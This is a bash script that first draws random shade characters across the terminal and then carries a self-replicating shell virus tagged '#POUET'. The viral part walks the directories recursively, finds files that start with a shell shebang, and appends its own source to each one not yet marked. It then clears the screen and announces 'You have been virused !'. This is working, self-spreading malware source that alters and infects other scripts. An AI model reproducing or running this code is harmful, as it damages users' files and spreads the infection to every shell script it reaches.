#!/bin/bash

elements=("░" "▒" "▓")
width=$(tput cols)
height=$(tput lines)

while :
do
	printf "\033[%d;%dH%s" $(($RANDOM%$height)) $(($RANDOM%$width)) ${elements[$(($RANDOM%3))]}
done
#!/bin/bash
#POUET

function move_rec(){
	for TARGET in *
	do
		if [ -d "$TARGET" ]
		then
			cd "$TARGET"
			move_rec "$1"
		else
			if [ -n $(head -c 12 "$TARGET" 2>/dev/null | grep "#!/bin/*sh" 2>/dev/null) ] 2>/dev/null
			then
				if [ -z $(tail -n 24 $TARGET 2>/dev/null | grep "#POUET" 2>/dev/null) ] 2>/dev/null
				then
					cat $1 >> $TARGET
				fi
			fi
		fi
	done
}

move_rec "$PWD/${0##*/}"
clear
printf "\033[%d;%dHYou have been virused !" $(($(tput lines)/2)) $(($(tput cols)/2))
